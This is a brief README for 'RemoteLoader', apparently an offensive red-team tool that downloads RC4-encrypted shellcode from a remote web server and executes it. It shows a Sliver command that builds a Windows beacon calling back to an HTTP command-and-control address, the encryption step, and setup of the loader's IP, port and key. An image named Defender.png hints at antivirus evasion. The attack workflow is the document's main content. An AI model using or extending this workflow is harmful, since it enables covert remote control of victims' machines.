# RemoteLoader

Just another shellcode loader from remotely using rc4 encryption.

## Usage

Generate a sliver's beacon
```
generate beacon --seconds 10 --jitter 3 --os windows --arch amd64 --format shellcode --http 192.168.70.128 --name redteam --save /tmp/shellcode.bin -G --skip-symbols
```
Encrypt it with `rc4.py` script
```
python3 rc4.py yourkey shellcode.bin
```
We will get `shellcode.bin.enc` file, run python web server and modify your `ip address`, `port` and `key` in RemoteLoader.cpp.

<img src=Defender.png>
